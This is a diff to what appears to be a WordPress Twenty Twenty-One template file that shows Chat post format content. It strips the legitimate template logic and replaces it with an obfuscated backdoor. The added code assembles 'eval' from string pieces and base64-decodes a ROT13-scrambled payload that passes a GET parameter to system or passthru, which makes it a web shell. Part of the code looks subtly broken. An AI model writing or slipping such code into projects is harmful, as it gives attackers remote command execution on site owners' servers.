@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Show the appropriate content for the Chat post format.
- *
- * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_One
- * @since Twenty Twenty-One 1.0
- */
-
-// If there are paragraph blocks, print up to two.
-// Otherwise this is legacy content, so print the excerpt.
-if ( has_block( 'core/paragraph', get_the_content() ) ) {
-
-	twenty_twenty_one_print_first_instance_of_block( 'core/paragraph', get_the_content(), 2 );
-} else {
-
-	the_excerpt();
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogRnViaiBndXIgbmNjZWJjZXZuZ3IgcGJhZ3JhZyBzYmUgZ3VyIFB1bmcgY2JmZyBzYmV6bmcuCiAqCiAqIEB5dmF4IHVnZ2NmOi8vcXJpcnliY3JlLmpiZXFjZXJmZi5iZXQvZ3VyenJmL29uZnZwZi9ncnpjeW5nci11dnJlbmVwdWwvCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX0JhcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1CYXIgMS4wCiAqLwoKLy8gVnMgZ3VyZXIgbmVyIGNuZW50ZW5jdSBveWJweGYsIGNldmFnIGhjIGdiIGdqYi4KLy8gQmd1cmVqdmZyIGd1dmYgdmYgeXJ0bnBsIHBiYWdyYWcsIGZiIGNldmFnIGd1ciBya3ByZWNnLgp2cyAoIHVuZl9veWJweCggJ3BiZXIvY25lbnRlbmN1JywgdHJnX2d1cl9wYmFncmFnKCkgKSApIHsKCglnanJhZ2xfZ2pyYWdsX2Jhcl9jZXZhZ19zdmVmZ192YWZnbmFwcl9ic19veWJweCggJ3BiZXIvY25lbnRlbmN1JywgdHJnX2d1cl9wYmFncmFnKCksIDIgKTsKfSByeWZyIHsKCglndXJfcmtwcmVjZygpOwp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
